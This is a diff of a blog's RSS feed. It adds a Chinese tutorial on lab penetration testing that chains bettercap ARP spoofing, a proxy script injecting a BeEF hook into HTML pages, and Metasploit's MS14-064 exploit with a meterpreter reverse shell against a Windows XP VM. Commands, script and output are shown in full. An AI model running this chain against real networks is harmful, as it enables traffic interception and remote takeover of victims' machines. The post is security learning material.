@@ -6,9 +6,259 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</copyright>
-    <lastBuildDate>Sat, 16 Jan 2021 23:59:59 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 02 Feb 2021 13:43:23 +0800</lastBuildDate>
     
         <atom:link href="https://weepingdogel.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试</title>
+        <link>https://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+        <pubDate>Tue, 02 Feb 2021 13:43:23 +0800</pubDate>
+        
+        <guid>https://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ -&lt;h2 id=&#34;序&#34;&gt;序&lt;/h2&gt;
+&lt;p&gt;嗯&amp;hellip; 惯例是要先说点废话嘛..&lt;/p&gt;
+&lt;p&gt;今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～&lt;/p&gt;
+&lt;p&gt;然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～&lt;/p&gt;
+&lt;p&gt;不多说啦，我们开始～&lt;/p&gt;
+&lt;h3 id=&#34;测试环境&#34;&gt;测试环境&lt;/h3&gt;
+&lt;p&gt;啊咧，先说说测试环境。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;攻击机&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Arch Linux&lt;/li&gt;
+&lt;li&gt;192.168.101.15&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;靶机&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows XP on VirtualBox&lt;/li&gt;
+&lt;li&gt;192.168.101.43&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;条件有限，就只能用 XP 啦～&lt;/p&gt;
+&lt;h3 id=&#34;用到的工具&#34;&gt;用到的工具&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;bettercap
+&lt;ul&gt;
+&lt;li&gt;首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧&amp;hellip;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;beef
+&lt;ul&gt;
+&lt;li&gt;用来劫持浏览器&amp;hellip; 然后可以干很多事情，具体的也不是很了解呢。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;msf
+&lt;ul&gt;
+&lt;li&gt;这个就是老朋友啦～&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;什么? nmap? 这次用不着哦～&lt;/p&gt;
+&lt;h2 id=&#34;测试过程&#34;&gt;测试过程&lt;/h2&gt;
+&lt;p&gt;首先是打开 &lt;code&gt;bettercap&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo bettercap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后我们会看到这样的返回结果..&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_14-18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_14-20.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后设置 arp 欺骗的目标：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;set arp.spoof.targets 192.168.101.43
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这里设置的 targets 是靶机的地址哦&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;接下来启动 beef ，和上面说的一样要加 &lt;code&gt;sudo&lt;/code&gt; 。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo beef
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到返回：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_14-28.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;那么来说说终端里显示的这几个链接&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hook URL: &lt;a href=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;http://192.168.101.15:3000/hook.js&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～&lt;/li&gt;
+&lt;li&gt;一会儿我们要把它写进一个攻击脚本里～&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;UI URL: &lt;a href=&#34;http://192.168.101.15:3000/ui/panel&#34;&gt;http://192.168.101.15:3000/ui/panel&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。
+&lt;img src=&#34;https://weepingdogel.github.io/img/Screenshot_2021-02-02_BeEF_Control_Panel.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录&lt;code&gt;（beef:beef）&lt;/code&gt;，甚至不能启动，比如我的 Arch 就会这样。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[14:40:25][!] ERROR: Default username and password in use!
+[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个时候你需要做的是修改 &lt;code&gt;config.yaml&lt;/code&gt; 这个文件中的用户名和密码，我的位置在 &lt;code&gt;/usr/share/beef/config.yaml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;改成这样&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;beef&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;version&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;0.5.0.0-alpha-pre&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# More verbose messages (server-side)&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;debug&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;false&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# More verbose messages (client-side)&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;client_debug&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;false&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# Used for generating secure tokens&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;crypto_default_value_length&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# Credentials to authenticate in BeEF.&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# Used by both the RESTful API and the Admin interface&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;credentials&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;        &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;user&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt;   &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;随便起个名字&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;        &lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;passwd&lt;/span&gt;:&lt;span style=&#34;color:#888&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;随便想个密码&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#888&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。&lt;/p&gt;
+&lt;p&gt;好了，话不多说，我们继续。&lt;/p&gt;
+&lt;p&gt;接下来我们要做的是写一个 js 脚本，给 bettercap 用。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;function&lt;/span&gt; onResponse(req,res){
+    &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;if&lt;/span&gt;(res.ContentType.indexOf(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt;)==&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0&lt;/span&gt;){
+        &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;var&lt;/span&gt; body=res.ReadBody();
+        &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;if&lt;/span&gt;(body.indexOf(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;&amp;lt;/head&amp;gt;&amp;#39;&lt;/span&gt;)!=-&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1&lt;/span&gt;){
+            res.Body=body.replace(
+                &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;&amp;lt;/head&amp;gt;&amp;#39;&lt;/span&gt;,
+               &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;&amp;lt;script type=&amp;#34;text/javascript&amp;#34; src=&amp;#34;http://192.168.101.15:3000/hook.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;#39;&lt;/span&gt;
+            );
+            }
+        }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将这个文件保存到你知道的目录，我将它保存到 &lt;code&gt;/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后我们回到 bettercap，设置 &lt;code&gt;http.proxy.script&lt;/code&gt; 这个参数为上面这个路径：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后依次启动 &lt;code&gt;net.probe&lt;/code&gt;、&lt;code&gt;arp.spoof&lt;/code&gt;、&lt;code&gt;http.proxy&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;net.probe on
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;arp.spoof on
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;http.proxy on
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;嗯&amp;hellip; 接下来就启动好了&amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后我们让靶机打开浏览器，打开一个网页&amp;hellip;&lt;/p&gt;
+&lt;p&gt;IE8 已经不支持 bing 的 https 了，所以一打开就上钩了..&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/VirtualBox_XP_02_02_2021_15_25_46.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后我们能做的事情就很多了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-27.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我决定使用内个 clippy 的模块，绑定一个 &lt;code&gt;ms14-064&lt;/code&gt; 的地址，现在轮到 msf 出场了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ msfconsole
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-31.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;启用模块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;use exploit/windows/browser/ms14_064_ole_code_execution
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看看模块的描述&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;info 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;Description:&lt;/p&gt;
+&lt;p&gt;This module exploits the Windows OLE Automation array vulnerability,
+CVE-2014-6332. The vulnerability is known to affect Internet
+Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
+and no patch for Windows XP. However, this exploit will only target
+Windows XP and Windows 7 box due to the Powershell limitation.
+Windows XP by defaults supports VBS, therefore it is used as the
+attack vector. On other newer Windows systems, the exploit will try
+using Powershell instead.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;机翻一下就是：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;看看设置&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;show options
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+
+   Name                   Current Setting  Required  Description
+   ----                   ---------------  --------  -----------
+   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
+   Retries                true             no        Allow the browser to retry the module
+   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT                8080             yes       The local port to listen on.
+   SSL                    false            no        Negotiate SSL for incoming connections
+   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
+   TRYUAC                 false            yes       Ask victim to start as Administrator
+   URIPATH                                 no        The URI to use for this exploit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: &amp;#39;&amp;#39;, seh, thread, process, none)
+   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一般来讲我们只需要设置一个 &lt;code&gt;SRVHOST&lt;/code&gt; 就可以了，但是刚刚 &lt;code&gt;bettercap&lt;/code&gt; 把 &lt;code&gt;8080&lt;/code&gt; 端口给占用了，因此我们需要重新设置一个 &lt;code&gt;SRVPORT&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;SRVHOST&lt;/code&gt; 设置为攻击机的地址&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;set SRVHOST 192.168.101.15
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;SRVPORT&lt;/code&gt; 任意指定一个空闲的端口&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;set SRVPORT 9999
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来我们得到了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.101.15:4444 
+[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
+[*] Server started.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;先把默认的 &lt;code&gt;Clippy image directory&lt;/code&gt; 地址改成攻击机的地址，再把这个链接 &lt;code&gt;http://192.168.101.15:9999/deCFhCIwXNHYT&lt;/code&gt; 填入 &lt;code&gt;Executable&lt;/code&gt; 这一栏里面。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-52.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后点击 &lt;code&gt;Execute&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这时，靶机就会发生一件有趣的事情&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/VirtualBox_XP_02_02_2021_15_53_43.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;无论点击哪个，都会跳转到 msf 的链接。&lt;/p&gt;
+&lt;p&gt;点击之后，msf 有了反应&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-55.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;一个 &lt;code&gt;meterpreter&lt;/code&gt; 连接建立了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-57.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入这个会话&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;sessions -i 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_15-59.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这时我们就可以正常使用 &lt;code&gt;meterpreter&lt;/code&gt; 操作这台靶机了..&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-02-02_16-00.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;getsystem&lt;/code&gt; 提权也没有问题。&lt;/p&gt;
+&lt;p&gt;至于 &lt;code&gt;meterpreter&lt;/code&gt; 的用法就不再继续写下去了，因为之前写过（逃。&lt;/p&gt;
+&lt;p&gt;然后到这里就算成功一大半了，剩下的就是后渗透，说很久都说不完呢～就到这里吧～&lt;/p&gt;
+&lt;h2 id=&#34;结尾&#34;&gt;结尾&lt;/h2&gt;
+&lt;p&gt;呼~ 写完了.. qwq&lt;/p&gt;
+&lt;p&gt;不过要声明一下，本文内容仅限于测试学习使用，&lt;strong&gt;别拿去干坏事&lt;/strong&gt;，否则后果自负哦～&lt;/p&gt;
+&lt;p&gt;最后，本站遵循 &lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34;&gt;CC-BY-NC 4.0 协议&lt;/a&gt;，转载请注明出处&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://cvedetails.com/cve/CVE-2014-6332/&#34;&gt;CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064&#34;&gt;Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/35229&#34;&gt;Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/35308&#34;&gt;Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows&#34;&gt;IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module&#34;&gt;CVE-2014-6332: it’s raining shells | forsec&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;amp;gid=1&amp;amp;pid=2&#34;&gt;kali bettercap的使用 | UsstZt&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_33066259/article/details/80737308&#34;&gt;Bettercap2.6与beef的使用_请你吃橘子-CSDN博客&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
